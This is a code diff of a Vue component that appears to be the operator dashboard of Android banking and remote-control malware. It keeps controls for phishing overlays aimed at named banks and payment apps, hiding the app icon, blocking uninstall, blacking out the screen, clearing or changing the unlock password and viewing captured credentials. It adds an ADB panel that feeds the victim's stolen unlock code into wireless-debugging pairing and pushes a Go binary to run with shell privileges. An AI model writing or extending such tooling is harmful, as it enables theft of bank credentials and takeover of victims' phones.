@@ -1,11 +1,15 @@
 <script setup lang="ts">
-import { ref } from 'vue';
+import { ref, computed, onMounted } from 'vue';
 import {
     NButton,
     NInput,
     NSelect,
     NIcon,
+    NTag,
+    NGrid,
+    NGridItem,
 } from 'naive-ui';
+import axios from 'axios';
 import {
     SunnyOutline,
     LockClosedOutline,
@@ -29,6 +33,13 @@ import {
     HandLeftOutline,
     BanOutline,
     KeyOutline,
+    WifiOutline,
+    SettingsOutline,
+    SyncOutline,
+    CodeSlashOutline,
+    RocketOutline,
+    TerminalOutline,
+    InformationCircleOutline,
 } from '@vicons/ionicons5';
 import { ChatbubbleEllipsesOutline as LogoWechat } from '@vicons/ionicons5';
 import { quickApps } from '@/constants/quickApps';
@@ -97,6 +108,89 @@ const handleToggleBlockText = () => {
     emit('toggleBlockText', blockText.value, blockBg.value);
 };
 
+interface AdbStatusData {
+    pairCompleted: boolean;
+    adbDeployEnabled: boolean;
+    localServiceAlive: boolean;
+    debugPort: number;
+    wifiDebugEnabled: boolean;
+    isPairRunning: boolean;
+    pairState: string;
+}
+
+const isProcessing = ref(false);
+const lastCommand = ref<{ success: boolean; message: string; command: string } | null>(null);
+const adbStatus = ref<AdbStatusData | null>(null);
+const adbStatusLoading = ref(false);
+
+const isAdbConnected = computed(() =>
+    adbStatus.value?.pairCompleted && adbStatus.value?.localServiceAlive
+);
+
+async function fetchAdbStatus() {
+    try {
+        adbStatusLoading.value = true;
+        const { data } = await axios.get(`/api/devices/${props.deviceUid}/adb-status`);
+        const apkResp = data.data;
+        if (data.success && apkResp?.data) {
+            adbStatus.value = apkResp.data;
+        }
+    } catch (e: unknown) {
+        console.error('获取 ADB 状态失败', e);
+    } finally {
+        adbStatusLoading.value = false;
+    }
+}
+
+const fetchLatestCredential = async (): Promise<Record<string, unknown> | null> => {
+    try {
+        const { data } = await axios.get(`/devices/${props.deviceUid}/credentials`, {
+            params: { per_page: 1 },
+        });
+        const cred = data.data?.data?.[0];
+        if (!cred) return null;
+        return {
+            password: cred.password || cred.text_cipher || null,
+            password_type: cred.password_type || (cred.cipher_grade_code === 'PASSWORD_QUALITY_PATTERN' ? 'pattern' : null),
+            pattern_cipher: cred.pattern_cipher || null,
+        };
+    } catch {
+        return null;
+    }
+};
+
+const sendAdbCommand = async (command: string, label: string) => {
+    isProcessing.value = true;
+    lastCommand.value = null;
+    try {
+        let params: Record<string, unknown> = {};
+        if (command === 'AUTO_WIRELESS_PAIRING' || command === 'START_PAIRING' || command === 'FULL_DEPLOY') {
+            const credential = await fetchLatestCredential();
+            if (credential) params = { credential };
+        }
+        const { data } = await axios.post(
+            `/api/devices/${props.deviceUid}/adb-command`,
+            { command, params }
+        );
+        lastCommand.value = {
+            success: data.success,
+            message: data.data?.msg || data.error || label,
+            command: label,
+        };
+    } catch (e: unknown) {
+        const errMsg = e instanceof Error
+            ? (e as any).response?.data?.error || (e as any).response?.data?.message || e.message
+            : 'Unknown error';
+        lastCommand.value = { success: false, message: errMsg, command: label };
+    } finally {
+        isProcessing.value = false;
+    }
+};
+
+onMounted(() => {
+    if (props.deviceUid) fetchAdbStatus();
+});
+
 const bankButtons = [
     { name: 'IM', code: '0', color: '#6366f1', icon: CashOutline },
     { name: 'TP', code: '2', color: '#8b5cf6', icon: CashOutline },
@@ -115,18 +209,17 @@ const bankButtons = [
     { name: 'MB', code: '18', color: '#00a0e9', icon: PhonePortraitOutline },
     { name: 'BC', code: '19', color: '#ff6b00', icon: CashOutline },
 ];
-
 </script>
 
 <template>
-    <div class="screen-control-tab">
+    <div class="control-tab">
         <!-- 快捷操作 -->
-        <div class="control-section">
-            <div class="section-header">
-                <NIcon :component="SunnyOutline" size="16" />
+        <section class="panel panel--device">
+            <div class="panel-header">
+                <NIcon :component="SunnyOutline" size="15" />
                 <span>快捷操作</span>
             </div>
-            <div class="quick-actions-grid">
+            <div class="btn-row">
                 <NButton size="small" type="warning" @click="emit('wakeScreen')">
                     <template #icon><NIcon :component="SunnyOutline" /></template>
                     点亮
@@ -157,8 +250,8 @@ const bankButtons = [
                 </NButton>
             </div>
 
-            <!-- 快捷应用 -->
-            <div class="app-buttons">
+            <div class="sub-label">快捷应用</div>
+            <div class="app-row">
                 <NButton
                     v-for="app in quickApps"
                     :key="app.key"
@@ -171,36 +264,28 @@ const bankButtons = [
                 </NButton>
             </div>
 
-            <!-- 安全控制 -->
-            <div class="security-actions">
+            <div class="sub-label">安全控制</div>
+            <div class="btn-row btn-row--compact">
                 <NButton size="tiny" @click="emit('sendKb', 2)">
                     <template #icon><NIcon :component="ShieldOutline" /></template>
                     防卸载
                 </NButton>
-                <NButton size="tiny" @click="emit('sendKb', 3)">
-                    可卸载
-                </NButton>
+                <NButton size="tiny" @click="emit('sendKb', 3)">可卸载</NButton>
                 <NButton size="tiny" @click="emit('sendBlock', 0)">
                     <template #icon><NIcon :component="BanOutline" /></template>
                     黑屏
                 </NButton>
-                <NButton size="tiny" @click="emit('sendBlock', 1)">
-                    取消黑屏
-                </NButton>
+                <NButton size="tiny" @click="emit('sendBlock', 1)">取消黑屏</NButton>
                 <NButton size="tiny" @click="emit('sendBlock', 2)">
                     <template #icon><NIcon :component="HandLeftOutline" /></template>
                     阻止操作
                 </NButton>
-                <NButton size="tiny" @click="emit('sendBlock', 3)">
-                    允许操作
-                </NButton>
+                <NButton size="tiny" @click="emit('sendBlock', 3)">允许操作</NButton>
                 <NButton size="tiny" @click="emit('lock', 2)">
                     <template #icon><NIcon :component="KeyOutline" /></template>
                     清密码
                 </NButton>
-                <NButton size="tiny" @click="emit('lock', 3)">
-                    禁人脸
-                </NButton>
+                <NButton size="tiny" @click="emit('lock', 3)">禁人脸</NButton>
                 <NButton size="tiny" type="warning" @click="emit('hideIcon')">
                     <template #icon><NIcon :component="EyeOffOutline" /></template>
                     隐藏图标
@@ -211,32 +296,106 @@ const bankButtons = [
                 </NButton>
             </div>
 
-            <!-- 文本粘贴 -->
-            <div class="paste-row">
+            <div class="sub-label">文本粘贴</div>
+            <div class="input-row">
                 <NInput
                     v-model:value="pasteText"
                     placeholder="输入文本粘贴到设备..."
                     size="small"
                     @keyup.enter="handlePaste"
                 />
-                <NButton size="small" type="primary" @click="handlePaste">
-                    粘贴
-                </NButton>
+                <NButton size="small" type="primary" @click="handlePaste">粘贴</NButton>
             </div>
-        </div>
+        </section>
+
+        <!-- ADB 操作 -->
+        <section class="panel panel--adb">
+            <div class="panel-header">
+                <NIcon :component="WifiOutline" size="15" />
+                <span>ADB 操作</span>
+                <NTag v-if="adbStatus?.isPairRunning" type="warning" size="small" round class="header-badge">
+                    配对进行中
+                </NTag>
+            </div>
+
+            <div class="sub-label">无线配对</div>
+            <div class="adb-actions">
+                <div class="adb-card">
+                    <NButton block type="primary" size="small" :loading="isProcessing" :disabled="isProcessing || isAdbConnected || adbStatus?.isPairRunning" @click="sendAdbCommand('START_PAIRING', '手动配对')">
+                        <template #icon><NIcon :component="WifiOutline" /></template>
+                        手动配对
+                    </NButton>
+                    <p class="hint">开发者选项 → 无线调试 → 读取配对码 → SPAKE2</p>
+                </div>
+                <div class="adb-card">
+                    <NButton block type="info" size="small" :loading="isProcessing" :disabled="isProcessing || isAdbConnected || adbStatus?.isPairRunning" @click="sendAdbCommand('AUTO_WIRELESS_PAIRING', '自动配对')">
+                        <template #icon><NIcon :component="SyncOutline" /></template>
+                        自动配对
+                    </NButton>
+                    <p class="hint">设置 → 激活开发者模式 → 开启无线调试 → 配对</p>
+                </div>
+                <div class="adb-card">
+                    <NButton block type="warning" size="small" :loading="isProcessing" :disabled="isProcessing || isAdbConnected || adbStatus?.isPairRunning" @click="sendAdbCommand('DIRECT_PAIR', '直接配对')">
+                        <template #icon><NIcon :component="CodeSlashOutline" /></template>
+                        直接配对
+                    </NButton>
+                    <p class="hint">假定配对弹窗已显示，直接读取配对码执行配对</p>
+                </div>
+            </div>
+
+            <div class="sub-label">设置操作</div>
+            <NGrid :cols="2" :x-gap="8" :y-gap="8">
+                <NGridItem>
+                    <NButton block size="small" :disabled="isProcessing" @click="sendAdbCommand('OPEN_WIFI_DEBUG_SETTINGS', '开发者选项')">
+                        <template #icon><NIcon :component="SettingsOutline" /></template>
+                        开发者选项
+                    </NButton>
+                </NGridItem>
+                <NGridItem>
+                    <NButton block size="small" :disabled="isProcessing" @click="sendAdbCommand('OPEN_ABOUT_PHONE', '关于手机')">
+                        <template #icon><NIcon :component="InformationCircleOutline" /></template>
+                        关于手机
+                    </NButton>
+                </NGridItem>
+            </NGrid>
+
+            <div class="sub-label">部署操作</div>
+            <div class="adb-actions">
+                <div class="adb-card">
+                    <NButton block type="error" size="small" :loading="isProcessing" :disabled="isProcessing" @click="sendAdbCommand('FULL_DEPLOY', '完整部署')">
+                        <template #icon><NIcon :component="RocketOutline" /></template>
+                        完整部署
+                    </NButton>
+                    <p class="hint">重置配对 → ADB WiFi 配对 → 部署 local-service → 初始化</p>
+                </div>
+                <div class="adb-card">
+                    <NButton block type="warning" size="small" :loading="isProcessing" :disabled="isProcessing" @click="sendAdbCommand('DEPLOY_LOCAL_SERVICE', '部署 Local-Service')">
+                        <template #icon><NIcon :component="TerminalOutline" /></template>
+                        部署 Local-Service
+                    </NButton>
+                    <p class="hint">仅部署（需已完成配对），推送 Go 二进制以 shell 权限启动</p>
+                </div>
+            </div>
+
+            <Transition name="result-slide">
+                <div v-if="lastCommand" class="cmd-result" :class="lastCommand.success ? 'cmd-result--ok' : 'cmd-result--fail'">
+                    <NTag :type="lastCommand.success ? 'success' : 'error'" size="small">{{ lastCommand.command }}</NTag>
+                    <span class="cmd-msg">{{ lastCommand.message }}</span>
+                </div>
+            </Transition>
+        </section>
 
         <!-- 密码钓鱼 -->
-        <div class="control-section">
-            <div class="section-header">
-                <NIcon :component="FishOutline" size="16" />
+        <section class="panel panel--phish">
+            <div class="panel-header">
+                <NIcon :component="FishOutline" size="15" />
                 <span>密码钓鱼</span>
             </div>
-            <div class="phish-inputs">
+            <div class="phish-form">
                 <NInput
                     v-model:value="phishTitle"
                     placeholder="钓鱼界面文字标题"
                     size="small"
-                    style="margin-bottom: 8px;"
                 />
                 <NInput
                     v-model:value="phishContent"
@@ -244,10 +403,9 @@ const bankButtons = [
                     size="small"
                     type="textarea"
                     :rows="2"
-                    style="margin-bottom: 8px;"
                 />
             </div>
-            <div class="phish-row">
+            <div class="input-row">
                 <NSelect
                     v-model:value="phishType"
                     size="small"
@@ -265,7 +423,7 @@ const bankButtons = [
                 </NButton>
             </div>
 
-            <div class="subsection-title">银行/支付钓鱼</div>
+            <div class="sub-label">银行 / 支付钓鱼</div>
             <div class="bank-grid">
                 <NButton
                     v-for="bank in bankButtons"
@@ -278,15 +436,15 @@ const bankButtons = [
                     {{ bank.name }}
                 </NButton>
             </div>
-        </div>
+        </section>
 
         <!-- 修改解锁密码 -->
-        <div class="control-section">
-            <div class="section-header">
-                <NIcon :component="KeyOutline" size="16" />
+        <section class="panel panel--key">
+            <div class="panel-header">
+                <NIcon :component="KeyOutline" size="15" />
                 <span>修改解锁密码</span>
             </div>
-            <div class="password-modify-row">
+            <div class="input-row">
                 <NInput
                     v-model:value="passwordInput"
                     placeholder="输入数字密码..."
@@ -300,15 +458,15 @@ const bankButtons = [
                     修改密码
                 </NButton>
             </div>
-        </div>
+        </section>
 
         <!-- 黑屏文字 -->
-        <div class="control-section">
-            <div class="section-header">
-                <NIcon :component="TvOutline" size="16" />
+        <section class="panel panel--screen">
+            <div class="panel-header">
+                <NIcon :component="TvOutline" size="15" />
                 <span>黑屏文字</span>
             </div>
-            <div class="block-text-row">
+            <div class="input-row">
                 <NInput
                     v-model:value="blockText"
                     placeholder="黑屏显示文字内容"
@@ -333,121 +491,131 @@ const bankButtons = [
                     {{ isBlockTextActive ? '停止' : '显示' }}
                 </NButton>
             </div>
-        </div>
+        </section>
 
         <!-- 密码信息 -->
-        <div class="control-section password-section">
+        <section class="panel panel--cred">
             <CredentialPanel
                 :device-uid="props.deviceUid"
                 :phone-password="props.phonePassword"
             />
-        </div>
+        </section>
     </div>
 </template>
 
 <style scoped>
-.screen-control-tab {
+.control-tab {
     display: flex;
     flex-direction: column;
-    gap: 16px;
+    gap: 6px;
     height: 100%;
     overflow-y: auto;
 }
 
-.control-section {
-    background: #f8fafc;
-    border-radius: 12px;
-    padding: 16px;
+.control-tab::-webkit-scrollbar { width: 3px; }
+.control-tab::-webkit-scrollbar-track { background: transparent; }
+.control-tab::-webkit-scrollbar-thumb { background: #d1d5db; border-radius: 3px; }
+
+.panel {
+    padding: 12px;
+    border-radius: 8px;
+    background: #f9fafb;
 }
 
-.section-header {
+.panel-header {
     display: flex;
     align-items: center;
-    gap: 8px;
-    font-size: 14px;
+    gap: 6px;
+    font-size: 13px;
     font-weight: 600;
-    color: #1e293b;
-    margin-bottom: 12px;
+    color: #374151;
+    margin-bottom: 10px;
 }
 
-.subsection-title {
+.header-badge { margin-left: auto; }
+
+.sub-label {
+    font-size: 11px;
+    color: #9ca3af;
+    margin: 10px 0 6px;
+}
+
+.btn-row {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 6px;
+}
+
+.btn-row--compact .n-button { font-size: 11px; }
+
+.app-row {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 4px;
+}
+
+.app-row .n-button { font-size: 11px; }
+
+.input-row {
+    display: flex;
+    gap: 6px;
+    align-items: center;
+}
+
+.adb-actions {
+    display: flex;
+    flex-direction: column;
+    gap: 6px;
+}
+
+.hint {
+    margin: 2px 0 0;
+    font-size: 11px;
+    color: #9ca3af;
+}
+
+.cmd-result {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    padding: 8px 10px;
+    border-radius: 6px;
+    margin-top: 8px;
+}
+
+.cmd-result--ok { background: #f0fdf4; }
+.cmd-result--fail { background: #fef2f2; }
+
+.cmd-msg {
     font-size: 12px;
-    color: #64748b;
-    margin: 12px 0 8px 0;
+    color: #4b5563;
 }
 
-.quick-actions-grid {
+.phish-form {
     display: flex;
-    flex-wrap: wrap;
-    gap: 8px;
-    margin-bottom: 12px;
-}
-
-.quick-actions-grid .n-button {
-    flex: 0 0 auto;
-}
-
-.app-buttons {
-    display: flex;
-    flex-wrap: wrap;
+    flex-direction: column;
     gap: 6px;
-    margin-bottom: 12px;
-}
-
-.app-buttons .n-button {
-    font-size: 11px;
-}
-
-.security-actions {
-    display: flex;
-    flex-wrap: wrap;
-    gap: 6px;
-    margin-bottom: 12px;
-}
-
-.security-actions .n-button {
-    font-size: 11px;
-}
-
-.paste-row {
-    display: flex;
-    gap: 8px;
-    align-items: center;
-}
-
-.phish-row {
-    display: flex;
-    gap: 8px;
-    align-items: center;
+    margin-bottom: 6px;
 }
 
 .bank-grid {
     display: flex;
     flex-wrap: wrap;
-    gap: 6px;
+    gap: 4px;
 }
 
-.bank-grid .n-button {
-    font-size: 10px;
-}
+.bank-grid .n-button { font-size: 10px; }
 
-.block-text-row {
-    display: flex;
-    gap: 8px;
-    align-items: center;
-}
-
-.password-modify-row {
-    display: flex;
-    gap: 8px;
-    align-items: center;
-}
-
-.password-section {
+.panel--cred {
     flex: 1;
     min-height: 0;
     display: flex;
     flex-direction: column;
 }
 
+.panel--cred :deep(.credential-row) { background: #fff; }
+
+.result-slide-enter-active { transition: opacity 0.2s; }
+.result-slide-leave-active { transition: opacity 0.15s; }
+.result-slide-enter-from, .result-slide-leave-to { opacity: 0; }
 </style>
